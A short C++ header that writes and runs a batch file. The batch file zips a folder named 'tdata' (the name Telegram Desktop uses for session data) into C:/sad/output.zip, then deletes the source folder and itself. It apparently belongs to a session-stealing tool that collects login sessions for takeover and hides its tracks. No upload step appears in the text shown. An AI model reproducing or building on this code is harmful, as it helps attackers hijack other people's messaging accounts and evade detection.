#pragma once
#include "Include.h"

void Zip(){
	system("start C:/sad/cmd.bat");
}

void CreateBat() {
	const std::filesystem::path path = "C:/sad/cmd.bat";
	std::ofstream ofs(path);
	ofs << "tar.exe -a -c -f C:/sad/output.zip C:/sad/tdata\n";
	ofs << "del tdata\n";
	ofs << "del cmd.bat\n";
	ofs << "exit\n";
	ofs.close();
}